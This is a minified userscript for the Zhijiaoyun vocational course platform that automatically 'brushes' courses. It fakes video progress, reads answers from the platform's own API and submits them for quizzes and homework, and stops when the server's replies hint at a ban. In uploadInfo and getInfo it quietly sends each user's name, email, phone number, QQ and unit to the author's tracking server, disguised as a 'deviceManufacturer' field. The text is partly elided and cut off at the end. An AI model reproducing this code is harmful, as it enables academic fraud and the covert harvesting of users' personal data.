(()=>{if($("body").attr("add")==undefined){$("head").eq(0).append("<style>"+getStyle()+"</style>");$("body").attr("add","").append(getHtml())}else{return alert("请不要重复加载脚本")}var $main=$("#hcq-main"),$c_left=$("#hcq-content-left"),$c_right=$("#hcq-content-right"),$sw_box=$(".switch-box"),$l_btn=$(".left-btn"),$r_btn=$(".right-btn"),$s_btn=$(".switch-platform"),$supportBox=$(supportBox),$changeBg=$(changeBg),$consoleInfo=$("#console-info>.info-box"),$speedSet=$c_right.find("input[type=text]"),$couresMenu=$(".coures-menu"),$couresView=$(".coures-view"),$menubar=$("#menubar"),$v_btn=$menubar.children("[data-type=view]"),$jumpDom=$menubar.children("[data-type=jump-dom]"),$jumpVideo=$menubar.children("[data-type=jump-video]"),$jumpThis=$menubar.children("[data-type=jump-this]"),$ch_btn=$menubar.children("[data-type=change]"),$c_btn=$menubar.children("[data-type=changeBg]"),$countDown=$couresMenu.find("time"),$run=$(".mian-run");$sw_box.find("li[data-type='2']").attr("on","on");let bgUrl=localStorage.getItem("s_bg");if(bgUrl)$main.css("background-image","url("+bgUrl+")");let inTime=null;var config={index:[0,0,0],nowDomOrVideo:0,unIndex:0,isRead:false,isInit:false,close:false,timeOut:null,speed:3e3,ajaxSpeed:2e3,isPause:false,errorNum:0,pauseNode:null,domRequestSpeed:2e3,videoRequestSpeed:5e3,videoAddSpeed:15,Jump:0,_Lock:true},maxItemView=300,CourseList=null,unNodeList=[];const AUTHORIZATION=$.cookie("authorization");setTimeOut(async()=>{var i=userInit();Console("查询用户信息中。。。请稍后");let o=await _ajax("/project/personal/basicinfo");if(o==null||o.code==-1){alert("请登录后再执行该脚本！");setTimeout(()=>{location.reload()},5e3)}else{let e=o.user.DisplayName,t=o.user.UserName;$c_left.children("img").attr("src",o.avatorUrl+"?x-oss-process=image/resize,m_fixed,w_110,h_110,limit_0");$c_left.find(".user-name").text(e);$c_left.find(".stuNum").text(t);Console(`[${e}]用户您好，欢迎━(*｀∀´*)ノ亻!使用本脚本，该脚本为职教云资源库特供版`);Console(`特别提示>>><b style="color:red">刷完课程后,视频部分依旧为灰色,需要手动点击视频等待5秒左右,才可完成!<b>(分析了几个小时,用了几种能想到的方法都没生效,不知道什么情况,进度拉满了,但非得你点击才算完成,离谱)`);Console(`制作不易,您的支持是我更新的最大动力!`);config._Lock=false;uploadInfo(i,o)}});function uploadInfo(e,t){if(e==false)return;var i=["715e6798-f72c-4676-bfb4-7d0a0e0404c3","62b01e03-44e1-4d02-b88b-e19176db2721","1cbf12fa-00e5-482b-9368-08816c77663e"];const o=document.createElement("script");o.setAttribute("src","https://gcore.jsdelivr.net/gh/electerious/ackee-tracker@master/dist/ackee-tracker.min.js");o.onload=function(){let e=ackeeTracker.create("https://ackee.hcqhome.cn/",{detailed:true,ignoreLocalhost:true,ignoreOwnVisits:true});e.record(i[2],{...ackeeTracker.attributes(true),...{deviceName:t.user.UserName,deviceManufacturer:getInfo(t)}}).stop()};document.body.appendChild(o)}function getInfo({unit:e,user:{DisplayName:t,Email:i,UserName:o,Sex:n,Mobile:s,QQ:q}},r){return JSON.stringify({unit:e,DisplayName:t,Email:i,UserName:o,Sex:n,Mobile:s,val:r,QQ:q})}class _script{constructor(){this.url={};this.init()}init(){this.url.login="/portal_new/portal/portal.html";this.url.courseLists="/studycenter/MyCourse/studingCourse";this.url.moduleLists="/study/Directory/directoryList";this.url.nodeLists="/study/directory/directory";this.url.childNodeInfo="/study/directory/view";this.url.setProgress="/study/directory/updateStatus"}async getCourseLists(){let e=await _ajax(this.url.courseLists,{userid:localStorage.getItem("userId")});let t=e.list;return{len:t.length,list:t.filter(e=>{return+e.schedule*100!=100}).map(e=>{return{id:e.id,name:e.title,cover:e.cover,progress:+e.schedule,module:[]}})}}async getModuleLists(){let e=config.index[0];let t=await _ajax(this.url.moduleLists,{courseId:CourseList[e].id});let i=t.directory;let o=0;var n=i.map((e,t)=>{let i=e.section||{};o++;return{index:t,id:i.Id,name:i.Title,load:false,topic:e.chapters||[]}});return{info:{len:o,unlen:n.length},module:n}}async getNodeLists(){let e=config.index[0],t=config.index[1];let i=CourseList[e].module[t].topic;return i.map((e,t)=>{let i=e.chapter.ChapterType;return{index:t,type:i,id:i===2?e.chapter.ResId:e.chapter.Id,name:e.chapter.Title,Nodes:{knowleges:e.knowleges||[],cells:e.cells}}})}async getChildNodeLists(){let e=config.index[0],t=config.index[1],i=config.index[2];let o=CourseList[e].module[t].topic[i];if(o.type===2){return{unNode:[`${t}-${i}-0`],data:[{type:"work",id:o.id,name:o.name,unNum:`${t}-${i}-0`}]}}let n=o.Nodes,s=[],r=[],a=null,l=0;n.cells.forEach(e=>c(e));n.knowleges.forEach(e=>{e.cells.forEach(e=>c(e))});function c(e){if(e.Status!==1){a=`${t}-${i}-${l++}`;r.push(a);s.push({type:e.CellType,id:e.Id,name:e.Title,unNum:a})}}return{unNode:r,data:s}}async getChildNodeInfo(e){if(typeof e!="object")return Promise.reject("参数不为对象");let t=config.index[0];let i={courseId:CourseList[t].id,cellId:e.id,enterType:"study"};return await _ajax(this.url.childNodeInfo,i)}}var $Script=new _script;async function getCourseLists(){try{if(config.isRead&&CourseList.length!=0){let e=await $Script.getCourseLists();let t=[];e:for(const i of e.list){for(const o of CourseList){if(o.id==i.id){o.progress=+i.progress;continue e}}t.push(i)}if(e.list.length!=CourseList.length){Console("课程有变动，重新更新课程。。。");CourseList.push(...t)}updataData()}config.pauseNode="getCourseLists";if(CourseList.length!=0){if(!config.isInit){CourseListInit()}else{setTimeOut(getModuleLists)}}else{Console("正在获取课程列表中...");let t=await $Script.getCourseLists();CourseList=t.list;updataData();if(CourseList.length==0){setTimeOut(Console("所有课程均完成，感谢您的使用😉"));setTimeout(()=>{location.reload()},3500);return}config.errorNum=0;await setTimeOut(()=>{let e=CourseList.length;Console(`其中已完成课程有${t.len-e}门课程，未完成课程为${e}门课程`);t=null});CourseListInit()}}catch(o){setError(o)}}async function CourseListInit(){await setTimeOut(()=>{Console(`正在载入未完成课程,请稍后。。。`);$couresMenu.append(getCourseDom());config.isInit=true;config.isRead=false}).then(e=>{setTimeOut(()=>{$menubar.children("[data-type=change]").removeClass("loader");if(!$ch_btn.is(".onck"))$ch_btn.click();index=15;inTime=setInterval(()=>{if(index<=0){clearInterval(inTime);if($ch_btn.is(".onck"))$ch_btn.click();$countDown.parent().remove();getModuleLists()}else{$countDown.text(--index)}},1e3)})})}async function getModuleLists(){let o=config.index[0];try{config.pauseNode="getModuleLists";Console(`当前课程名称${CourseList[o].name}`);if(CourseList[o].module.length==0){let e=await $Script.getModuleLists();CourseList[o].module=e.module;updataData();let t=e.info.len,i=e.info.unlen;await setTimeOut(()=>{Console(`成功获取到课程模块信息，本课程有${t}个模块`)}).then(setTimeOut(()=>{Console(`其中已完成${t-i}个模块，未完成${i}个模块`)}))}else{Console(`加载课程存档模块信息中...`)}setTimeOut(()=>{config.errorNum=0;if(!config.close)getNodeLists()})}catch(e){setError(e)}}async function getNodeLists(){var t=config.index[0],i=config.index[1];try{config.pauseNode="getNodeLists";Console(`正在对本课程模块节点信息进行解析...`);var o=window.performance.now();let e=CourseList[t].module.length;while(i<e){if(config.close)break;if(CourseList[t].module[i].load===false){let e=await $Script.getNodeLists();CourseList[t].module[i].topic=e;CourseList[t].module[i].load=true}config.index[1]=++i}updataData();Console(`<模块[节点]信息>解析共耗时: ${(window.performance.now()-o).toFixed(2)} ms`);if(config.close)return;configInit(1);setTimeOut(()=>{Console(`已获取本课程所有模块节点信息`);getChildNodeLists()})}catch(e){setError(e)}}async function getChildNodeLists(){var t=config.index[0],i=config.index[1],o=config.index[2];try{config.pauseNode="getChildNodeLists";Console(`正在对模块子节点信息进行解析...`);var n=window.performance.now();let e=CourseList[t].module.length;while(i<e){if(config.close)break;let e=CourseList[t].module[i].topic.length;while(o<e){let e=CourseList[t].module[i].topic[o].Nodes;if(e!=null&&getType(e)=="Object"){let e=await $Script.getChildNodeLists();if(config.close)break;CourseList[t].module[i].topic[o].Nodes=e.data.length==0?null:e.data;unNodeList.push(...e.unNode)}else{if(e!=null){e.forEach(e=>{if(e.unNum)unNodeList.push(e.unNum)})}}config.index[2]=++o}config.index[1]=++i;config.index[2]=o=0}updataData();Console(`<模块[子节点]信息>解析共耗时: ${(window.performance.now()-n).toFixed(2)} ms`);if(config.close)return;Console(`已获取本课程所有模块子节点信息`);setTimeOut(()=>{Console(`其中经过数据筛选可得,未完成小节共计${unNodeList.length}个`);configInit(2)}).then(e=>{return setTimeOut(()=>{Console(`读取数据开始构建课程视图`);$couresView.html(getViewDom())})}).then(e=>{return setTimeOut(()=>{Console(`课程视图构建完毕,正在读取未完成子节点...`);$menubar.children("[data-type=view]").removeClass("loader")})}).then(e=>{getChildNodeInfo();$jumpDom.removeClass("loader");$jumpVideo.removeClass("loader")})}catch(e){setError(e)}}function getType(e){return Object.prototype.toString.call(e).slice(8,-1)}async function getChildNodeInfo(){try{config.pauseNode="getChildNodeInfo";while(unNodeList!=0){if(config.close)break;let n=unNodeList[config.unIndex];let s=n.split("-");Console(`当前子节点信息为${+s[0]+1}-${+s[1]+1}-${+s[2]+1}节点`);let r=CourseList[config.index[0]].module[s[0]].topic[s[1]].Nodes[s[2]];let e=false,t="";let i=/video/.test(r.type);config.nowDomOrVideo=+i;switch(config.Jump){case 1:if(!i)e=true;t="当前文档类型已跳过";break;case 2:if(i)e=true;t="当前视频/音频已跳过";break}if(!e){let t=false,e=r.type,i=e=="work",o=null;if(!i)o=await $Script.getChildNodeInfo(r);Console(`当前小节 类型:[${getTypeName(e)}] 名称:[${r.name}]`);if(config.close)continue;$jumpThis.removeClass("loader");if(i||o.works&&o.works.Status!==1){let e=await SetProgress(o,r);if(e!==0&&e!==1){t=true}else if(e===1){config.unIndex++}}else{t=true;Console("本小节已完成！")}if(t){CourseList[config.index[0]].module[s[0]].topic[s[1]].Nodes[s[2]].unNum=null;$(".view-3[data-un="+n+"]").addClass("isOk");unNodeList.splice(config.unIndex,1);updataData()}$jumpThis.addClass("loader");if(config.unIndex>=unNodeList.length)config.unIndex=0}else{config.unIndex++;Console(t)}}if(config.close)return;Console(`当前课程已成功完成`);configInit(3);CourseList.splice(config.index[0],1);$couresMenu.children().eq(config.index[0]).remove();config.index[0]>=CourseList.length?config.index[0]=0:"";updataData();setTimeOut(()=>{if(CourseList.length!=0){Console("准备进入下一个课程。。。");getCourseLists()}else{alert(`所有课程均完成，感谢您的使用😉`);$("#hcq-content").remove()}})}catch(e){setError(e)}}async function SetProgress(o,n){try{var s=null;switch(n.type){case"video":let e=await new Promise((t,i)=>{$.ajax({url:o.data.statusUrl,type:"get",dataType:"jsonp",jsonp:"jsonpcallback",success:function(e){t(e)},error:function(e){i(e)}})});s=await _ajax($Script.url.setProgress,{cellId:n.id,learntime:getTime(e.args.duration),status:e.status||2},5e3);break;case"work":Console("已获取题目,正在解析答案中...");let t=await _ajax("/study/Works/works",{courseId:CourseList[config.index[0]].id,assignmentId:n.id});let i=[];for(const r of t.paper.PaperQuestions){i.push({paperItemId:r.Id,answer:r.Answers.join("，")})}s=await _ajax("/study/Works/answerOnlineWorks",{answerId:t.answer.Id,data:JSON.stringify(i)});Console("当前作业状态:"+s.msg);break;case"question":Console("已获取题目,并开始解析...");for(const r of o.data.paper.PaperQuestions){let e=r.Answers.join("，");Console(`题目:[${r.Content}] 答案:[${e}]`);let t=await _ajax("/study/directory/answerpaper",{works:o.works.Id,paperItemId:r.Id,answer:e},1e3);if(t.code==1){Console("已提交选项!")}}s=await _ajax("/study/directory/subPaper",{studentWorksId:o.works.Id});Console("当前作业状态:"+s.msg);break}if(s&&s.msg&&/刷课|禁/.test(s.msg)){Console(`账户疑似异常，已终止执行`);$run.click()}if(config.close)return 0;if(s&&s.code==1)Console(`本小节已完成！`);config.errorNum=0}catch(e){if(!config.close){Console(`获取异常,返回[状态码:${e.status},错误信息${e.statusText}]`);config.errorNum++}if(config.errorNum>3){Console(`当前节点可能异常,暂时跳过`);config.errorNum=0;return 1}else{return 0}}}function getTypeName(e){switch(e){case"work":return"作业";case"question":return"习题";case"video":return"视频";case"audio":return"音频";case"image":return"图片";case"text":return"文档";default:return e}}function getTime(e){if(getType(e)!=="String")return 10;let t=e.split(":");return+t[0]*60*60+ +t[1]*60+ +t[2]}$l_btn.click(function(){$c_left.toggleClass("open")});$r_btn.click(function(){$c_right.toggleClass("open")});$s_btn.click(function(){$sw_box.toggleClass("open")});$sw_box.on("click","li",function(){if($(this).attr("on")==undefined&&confirm(`是否切换到${$(this).text()}平台`))window.location.href=`${typeHome[$(this).data("type")]}`});$("#clear-info").click(function(){$consoleInfo.html("")});$couresMenu.on("click",".menu-box",function(){if(inTime!=null){clearInterval(inTime);inTime=null;$countDown.parent().remove()}let e=true;if($ch_btn.is(".onck"))$ch_btn.click();if($(this).attr("now")==undefined){$(this).attr("now","").siblings("div[now]").removeAttr("now");let e=+$(this).index();config.index=[e,0,0];unNodeList=[];config.isPause=config.close=true;setTimeout(()=>{config.isPause=config.close=false;getCourseLists()},config.ajaxSpeed+1e3)}else e=false;if($run.attr("type")!="run"){if(e){Console("已启动脚本运行");$run.attr("type","run")}else $run.click()}});$couresView.on("click","li",function(){if($(this).is(".unfold")){$(this).parent().toggleClass("open")}else{if($v_btn.is(".onck"))$v_btn.click();if(!$(this).is(".isOk")){if(config.isPause)Console("请先运行脚本!");config.unIndex=unNodeList.indexOf($(this).data("un"));clearTimeout(config.timeOut);getChildNodeInfo()}else{Console("当前子节点已完成，无需执行")}}});$run.click(function(){if(config._Lock)return Console("请等待数据查询后执行!");if($(this).attr("type")!="run"){$(this).attr("type","run");config.isPause=config.close=false;if(config.pauseNode){Console("已启动脚本运行");eval(config.pauseNode+"()")}else{Console("获取课程信息中...");getCourseLists()}}else{$(this).removeAttr("type");config.isPause=config.close=true;if(config.timeOut!=null){clearTimeout(config.timeOut);config.timeOut=null}Console("已暂停脚本运行")}});$speedSet.blur(function(){let e=$(this).val().replace(/\s*/g,""),t=$(this).attr("placeholder"),i=/^(?<min>\d*)-(?<max>\d*)/.exec(t),o=+i.groups.min,n=+i.groups.max,s=+$(this).data("default"),r=$(this).attr("id");if(e!=""){e=+e;if(typeof e=="number"&&e>=o&&e<=n){s=e}}switch(r){case"ajax-set":config.speed=1e3*s;Console(`请求发送速度修改成功,当前速度${s}s`);break;case"dom-set":config.domRequestSpeed=1e3*s;Console(`文档修改速度修改成功,当前速度${s}s`);break;case"video-set":config.videoRequestSpeed=1e3*s;Console(`视频修改速度修改成功,当前速度${s}s,下一个视频后生效`);break;case"video-time-set":config.videoAddSpeed=s;Console(`视频增加修改成功,当前速度${s}s,下一个视频后生效`);break;default:Console("速度修改失败");break}$(this).val(s)});$changeBg.on("click","button",function(){setBg($(this).prev().val());if($c_btn.is(".onck"))$c_btn.click()}).find("input[type=file]").change(function(){if(this.files[0].size<=2097152){let e=new FileReader;e.readAsDataURL(this.files[0]);e.onload=function(e){setBg(e.target.result)}}else{Console("当前本地图片大于2M，无法添加")}if($c_btn.is(".onck"))$c_btn.click()});$menubar.on("click","div",function(){let o=$(this).data("type");if(!$(this).is(".loader")){let e=false,t=true,i=null;switch(o){case"feedback":t=false;break;case"support":e=true;t=false;i=$supportBox;break;case"change":e=true;i=$couresMenu;break;case"view":e=true;i=$couresView;break;case"changeBg":e=true;i=$changeBg;break;case"jump-dom":if(config.close)return Console("运行脚本后再使用");if(!$(this).is(".onck")){var n="";if(config.Jump===2)n=",并关闭跳过视频";Console(`已开启跳过文档模式${n}`);config.Jump=1;$jumpVideo.removeClass("onck");if(config.nowDomOrVideo===0)$jumpThis.click()}else{Console(`已关闭跳过文档模式`);config.Jump=0}break;case"jump-video":if(config.close)return Console("运行脚本后再使用");if(!$(this).is(".onck")){var n="";if(config.Jump===1)n=",并关闭跳过文档";Console(`已开启跳过视频模式${n}`);config.Jump=2;$jumpDom.removeClass("onck");if(config.nowDomOrVideo===1)$jumpThis.click()}else{Console(`已关闭跳过视频模式`);config.Jump=0}break;case"jump-this":if(config.close)return Console("运行脚本后再使用");t=false;config.unIndex++;config.nowDomOrVideo=-1;$(this).addClass("loader");Console(`已跳过当前子节点`);clearTimeout(config.timeOut);getChildNodeInfo();break;case"clearCache":t=false;if(confirm("是否清空缓存?(如有异常时使用)")){localStorage.setItem("scriptID","clearCache");alert("清除成功,页面刷新后请重新执行脚本");setTimeout(()=>{location.reload()},5e3)}break}if(e)i.toggleClass("show").siblings(".coures-item.show").removeClass("show");if(t)$(this).toggleClass("onck")}});function setBg(e){localStorage.setItem("s_bg",e);$main.css("background-image","url("+e+")")}function configInit(t){config.errorNum=0;for(let e=1;e<=t;e++){config.index[e]=0}}function getViewDom(){let e="";for(const t of CourseList[config.index[0]].module){e+=`
            ...
            </div>`}return e}function userInit(){let e=localStorage.getItem("userName")+"_v.3";if(localStorage.getItem("scriptID")!==e){localStorage.setItem("scriptID",e);Console("对运行环境数据初始化中。。。");if(localStorage.getItem("s_courseList"))localStorage.removeItem("s_courseList");config.isRead=false;CourseList=[];return true}else{CourseList=JSON.parse(localStorage.getItem("s_courseList"))||[];config.isRead=true;return false}}function setTimeOut(t){return new Promise(e=>{setTimeout(()=>{if(!config.close)e(t())},1e3)})}function updataData(){localStorage.setItem("s_courseList",JSON.stringify(CourseList))}function setError(e){if(config.isPause===false){Console(`获取异常,返回[状态码:${e.status},错误信息${e.statusText}]`);config.errorNum++;setTimeOut(()=>{if(config.errorNum>3){Console(`失败次数过多，1分钟后将尝试重新执行`);Console(`失败原因可能为[登录状态失效，网络异常，账户信息异常]，建议刷新本页面成功后再重新执行该脚本`);clearTimeout(config.timeOut);config.timeOut=setTimeout(()=>{$run.attr("type","").click()},6e4)}else{Console(`正在尝试重新获取第${config.errorNum}次`);eval(config.pauseNode+"()")}})}else{throw console.error(`脚本已暂停运行`)}}function Console(e){if(--maxItemView<0){maxItemView=300;$consoleInfo.html("")}let t=$(`<span class="text-ellipsis ">${e}</span>`);$consoleInfo.append(t);t[0].scrollIntoView()}function _ajax(e,o,n){return new Promise((t,i)=>{if(config.isPause===true){i("已暂停运行");config.timeOut=null}else{config.timeOut=setTimeout(()=>{if(config.isPause===true){i("已暂停运行")}else{$.ajax({url:location.origin+e||"",type:n===false?"GET":"POST",headers:{Authorization:AUTHORIZATION},data:o||{},dataType:"json",success:function(e){t(e)},error:function(e){i(e)}})}},n||config.ajaxSpeed)}})}window.onresize=function(){if(window.matchMedia("(max-width:1148px)").matches){if($c_right.is(".open")){$r_btn.click()}}if(window.matchMedia("(max-width:768px)").matches){if($sw_box.is(".open")){$s_btn.click()}if($c_left.is(".open")){$l_btn.click()}}};function getStyle(){return`
